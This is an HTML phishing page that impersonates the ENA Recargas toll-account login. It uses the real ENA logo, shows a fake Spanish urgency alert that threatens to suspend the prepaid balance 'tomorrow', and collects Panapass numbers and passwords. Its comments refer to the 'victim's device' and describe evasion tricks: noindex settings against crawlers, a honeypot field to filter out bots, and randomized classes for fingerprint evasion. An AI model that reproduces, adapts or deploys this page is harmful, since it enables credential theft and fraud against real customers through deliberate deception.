<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Anti-crawler meta: Prevents indexing by search bots -->
    <meta name="robots" content="noindex, nofollow">
    <title>ENA Recargas - Login</title>
    <style>
        /* Full-screen responsive background image */
        body {
            background-image: url('/static/background.jpg');  /* Corrected path for Flask static folder */
            background-size: cover;  /* Covers the entire screen, scales responsively */
            background-position: center;  /* Centers the image */
            background-repeat: no-repeat;  /* No tiling */
            background-attachment: scroll;  /* Keeps it fixed during scrolling (optional, remove if you want it to scroll) */
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #172c33;
            min-height: 100vh;  /* Ensures it covers full height on mobile */
        }
        .header {
            background-color: transparent;  /* Make header background transparent to show image */
            color: white;
            padding: 10px;
            text-align: center;
        }
        .header img {
            width: 30%;
            height: auto;
        }
        .login-container {
            max-width: 400px;
            margin: 50px auto;  /* Keeps it centered */
            background: rgba(255, 255, 255, 0.6);  /* Reduced transparency (was 0.9) for smoother image visibility */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            color: black;
        }
        button {
            background-color: #273c53;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        button:hover {
            background-color: #1f3043;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .urgency-alert {
            background-color: #ffdddd;
            border: 1px solid #ff0000;
            color: #d8000c;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
            font-weight: bold;
            text-align: center;
        }
        .honeypot {
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.enarecargas.com/maxipista/VAADIN/themes/privatetheme/img/logoEna.jpg" alt="ENA Logo">
    </div>

    <!-- Randomized class for anti-fingerprinting -->
    <div class="login-container" id="dynamic-container">
        <div class="urgency-alert" id="urgencyMessage">
            ¡Verificación Obligatoria! Debido a actualizaciones de seguridad, inicia sesión para verificar tu cuenta antes del [fecha] o tu saldo prepago será suspendido temporalmente.
        </div>
        <h2>Iniciar Sesión</h2>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="panapass">Nº Panapass*</label>
                <input type="text" id="panapass" name="panapass" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña*</label>
                <input type="password" id="password" name="password" required>
            </div>
            <!-- Honeypot field: Crawlers/bots might fill this; check in backend -->
            <div class="honeypot">
                <label for="website">Sitio Web</label>
                <input type="text" id="website" name="website">
            </div>
            <button type="submit">identificarse</button>
        </form>
    </div>

    <div class="footer">
        <p>Transacción Segura | Contacto: 800-ENA</p>
    </div>

    <script>
        // Dynamic date detection using victim's local device time
        // Detects current date on victim's phone/computer and calculates tomorrow's date (includes month)
        (function() {
            var today = new Date();  // Gets current date on victim's device
            var tomorrow = new Date(today);
            tomorrow.setDate(today.getDate() + 1);  // Calculate tomorrow's date

            // Format tomorrow's date in Spanish (includes day and month, e.g., "19 de septiembre")
            var options = { day: 'numeric', month: 'long' };
            var formattedTomorrow = tomorrow.toLocaleDateString('es-ES', options);

            // Replace [fecha] with tomorrow's date (dynamically includes the month)
            var messageElement = document.getElementById('urgencyMessage');
            messageElement.textContent = messageElement.textContent.replace('[fecha]', formattedTomorrow);

            // Randomize container class for fingerprint evasion
            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
            document.getElementById('dynamic-container').classList.add(randomClass);
        })();
    </script>
</body>
</html>
